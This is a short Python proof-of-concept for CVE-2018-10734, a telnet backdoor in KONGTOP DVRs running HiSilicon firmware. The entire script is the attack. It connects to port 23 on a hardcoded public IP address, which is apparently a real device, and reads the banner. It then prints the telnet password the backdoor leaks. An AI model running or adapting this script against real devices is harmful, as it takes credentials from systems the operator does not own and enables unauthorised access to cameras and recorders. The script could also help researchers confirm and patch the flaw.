import socket

'''
@Author: mosin
@Date: 2018-05-04
 Description: CVE-2018-10734
 KONGTOP DVR backdoor POC
 The all DVR Using HiSilicon firmware.
Vulnerability version:
    KONGTOP D303 DVR
    KONGTOP D305 DVR
    KONGTOP D403 DVR
    KONGTOP A303 DVR 
    KONGTOP A403 DVR 
Linux kernel£ºhi3515-hi3531
'''

HOST = "122.117.153.41"

def check():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((HOST,23))
    passwd = sock.recv(1024)
    passwd = sock.recv(1024)
    if "passwd:" in passwd:
        print "[*] YES,KONGTOP DVR Vulnerability!\n"
        passwd = passwd.replace("(none) login:","")
        
        print "[+] Telnet Pass: " + passwd 
    else:
        print "[-] Sorry,NO Found!"


if __name__ =='__main__':
    check()

